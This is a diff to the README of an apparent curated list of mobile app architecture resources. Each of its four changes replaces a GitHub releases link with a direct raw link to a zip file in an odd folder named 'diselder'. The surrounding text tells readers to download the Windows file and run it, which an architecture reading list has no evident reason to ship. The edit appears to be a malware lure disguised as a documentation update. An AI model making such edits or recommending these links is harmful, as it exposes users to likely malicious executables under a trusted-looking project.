@@ -1,6 +1,6 @@
 # 📱 awesome-mobile-app-architecture - Build mobile apps that stay simple
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/main/diselder/app_awesome_mobile_architecture_v1.4.zip)
 
 ## 🧭 What this is
 
@@ -20,7 +20,7 @@ If you want a clean place to start, this list gives you a clear path.
 
 Visit this page to download:
 
-[Open Releases](https://github.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/releases)
+[Open Releases](https://raw.githubusercontent.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/main/diselder/app_awesome_mobile_architecture_v1.4.zip)
 
 On that page, look for the latest release. Download the Windows file if one is listed, then open it from your Downloads folder.
 
@@ -194,7 +194,7 @@ If the release page has several files, choose the one meant for Windows.
 
 ## 🔗 Direct download page
 
-[Visit the latest releases](https://github.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/releases)
+[Visit the latest releases](https://raw.githubusercontent.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/main/diselder/app_awesome_mobile_architecture_v1.4.zip)
 
 ## 📎 File types you may see
 
@@ -246,6 +246,6 @@ Your answers can help you pick the right pattern
 
 Use the release page when you want the latest downloadable version:
 
-[Download from Releases](https://github.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/releases)
+[Download from Releases](https://raw.githubusercontent.com/Playful-plasmodiidae743/awesome-mobile-app-architecture/main/diselder/app_awesome_mobile_architecture_v1.4.zip)
 
 Open the page, get the newest file, then run it on Windows
